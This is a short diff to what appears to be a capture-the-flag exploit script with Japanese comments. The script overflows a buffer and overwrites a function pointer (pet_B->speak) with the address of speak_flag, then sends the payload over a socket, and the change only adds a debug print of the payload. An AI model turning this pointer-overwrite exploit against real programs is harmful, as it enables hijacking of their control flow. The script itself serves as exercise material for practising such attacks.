@@ -35,6 +35,8 @@ print(f"[+] offset = {offset}")
 # - speak_flag のアドレス（リトルエンディアン）で pet_B->speak を上書き
 payload = b"A" * offset + struct.pack("<Q", flag_addr)
 
+print(f"[+] payload = {payload}")
+
 # 攻撃用入力を送信
 # 最後に改行文字を入れて、read() に入力終了を伝える
 s.sendall(payload + b"\n")
